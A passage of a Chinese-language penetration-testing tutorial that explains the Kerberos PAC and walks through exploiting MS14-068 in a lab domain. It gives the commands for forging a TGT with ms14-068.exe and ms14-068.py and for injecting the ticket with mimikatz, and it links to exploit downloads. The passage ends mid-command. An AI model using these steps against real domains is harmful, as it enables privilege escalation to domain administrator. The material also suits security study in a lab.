ST ，就可以访问服务了。此时任何一个经过身份验证的用户都可以访问任何服务。像这样的认证只解决了 "Who am i?" 的问题，而没有解决 "What can I do?" 的问题。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">为了解决上面的这个问题，微软引进了PAC。即 KDC 向客户端 Client 返回&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">AS_REP</code>&nbsp;时插入了 PAC，PAC 中包含的是用户的 SID、用户所在的组等一些信息。当最后服务端 Server 收到 Client 发来的&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">AP_REQ</code>&nbsp;请求后，首先会对客户端身份验证。通过客户端身份验证后，服务器 Server 会拿着 PAC 去询问 DC 该用户是否有访问权限，DC 拿到 PAC 后进行解密，然后通过 PAC 中的 SID 判断用户的用户组信息、用户权限等信息，然后将结果返回给服务端，服务端再将此域用户请求的服务资源的 ACL 进行对比，最后决定是否给用户提供相关的服务。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">但也恰恰是是这个 PAC，造成了 MS14-068 这个漏洞。该漏洞是位于 kdcsvc.dll 域控制器的密钥分发中心（KDC）服务中的 Windows 漏洞，它允许经过身份验证的用户在其获得的票证 TGT 中插入任意的 PAC 。普通用户可以通过呈现具有改变了 PAC 的 TGT 来伪造票据获得管理员权限。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">攻击者要利用 MS14-068 这个漏洞提权时，需要掌握下面几个信息：</p><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域内任意用户SID</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域内任意用户密码</span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">实验环境如下：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5695284159613059" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/17_Q87GKTTRZbAibniaJ1QGxEmX4IEVRA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBlHxiaGUwpfwiacY80FpBtCN3JacU4Q87GKTTRZbAibniaJ1QGxEmX4IEVRA/640?wx_fmt=png'" data-type="png" data-w="827" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210522120058315</figcaption></figure><blockquote style="margin: 2em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgba(0, 0, 0, 0.5);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-left: none;padding: 1em;border-radius: 8px;background: rgb(247, 247, 247);"><p style="-webkit-tap-highlight-color: transparent;color: rgb(80, 80, 80);line-height: 1.75;font-size: 1em;letter-spacing: 0.1em;">域成员主机：Windows 7</p><p style="-webkit-tap-highlight-color: transparent;color: rgb(80, 80, 80);line-height: 1.75;font-size: 1em;letter-spacing: 0.1em;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>IP：192.168.93.20</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域名：whoamianony.org</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>用户名：bunny</span></p><p style="-webkit-tap-highlight-color: transparent;color: rgb(80, 80, 80);line-height: 1.75;font-size: 1em;letter-spacing: 0.1em;">域控制器：Windows Server 2012</p><p style="-webkit-tap-highlight-color: transparent;color: rgb(80, 80, 80);line-height: 1.75;font-size: 1em;letter-spacing: 0.1em;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>IP：192.168.93.30</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域名：whoamianony.org</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>用户名：administrator</span></p></blockquote><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">利用 MS14-068.exe</h3><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>下载地址：https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">首先，我们需要在目标主机 Windows 7 上面获得一个任意域用户的 SID：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">whoami </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">all</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.21961932650073207" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/18_6PvencgbAosKZoXRPbXnvrzWFcFskw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBlS05g60d8ps5K5F4gEwHiahhfic6PvencgbAosKZoXRPbXnvrzWFcFskw/640?wx_fmt=png'" data-type="png" data-w="683" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521095017222</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后再 Windows 7 上传工具 ms14-068.exe，并执行如下命令生成 TGT 票据：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ms14</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">068.exe</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">u bunny@whoamianony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">s S</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">21</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1315137663</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3706837544</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1429009142</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1112</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">d </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">192.168</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">93.30</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">p </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Bunny2021</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);"># ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器ip地址 -p 域成员密码</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.18661971830985916" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/19_Y89O7BqfficuUNAZLkOic9UZbYoicQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBl1DzEeicozzicoBA89DmQL9pAKdE8CY89O7BqfficuUNAZLkOic9UZbYoicQ/640?wx_fmt=png'" data-type="png" data-w="1136" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521095353167</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如上图所示，成功生成了一个名为&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">TGT_bunny@whoamianony.org.ccache</code>&nbsp;的票据文件，接下来要做的就是将该票据文件注入到 Windows 7 的内存中了。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">在 Windows 7 上传 mimikatz，利用 mimikatz 将票据注入到当前内存中，伪造凭证：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">purge         </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">list          </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//查看当前机器凭证</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ptc </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&lt;票据文件&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">   </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//将票据注入到内存中</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.530631479736098" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/20_2PwQ4Wd8ZFOIEIo5HHXHw7NJZl3WJQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBlY7JCjVSNE3PC0czKNn7xku922PwQ4Wd8ZFOIEIo5HHXHw7NJZl3WJQ/640?wx_fmt=png'" data-type="png" data-w="1061" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521095635571</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">执行&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">klist</code>&nbsp;命令查看票据注入是否成功：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.3553615960099751" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/21_ib7VwhTMiaXebvFSuMIqhdUhDQic7w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBleicKROG4V5gMTVwLPlSSVbGLSElCib7VwhTMiaXebvFSuMIqhdUhDQic7w/640?wx_fmt=png'" data-type="png" data-w="802" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521095754118</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如上图，票据注入成功，此时，攻击者就可以利用 Windows 7 这个跳板机任意访问域中所有机器了，可以使用 net use 进行登录或者使用 psexec，wmi 等方法进行远程执行命令，后续的操作就和黄金票据一样了。</p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">利用 ms14-068.py</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">在 Linux 环境下，我们可以通过 ms14-068.py 利用该漏洞，下载地址：https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">使用方法与 ms14-068.exe 一样：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">python ms14</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">068.py</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">u bunny@whoamianony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">s S</span><span style="-webkit-tap-highlight-color: 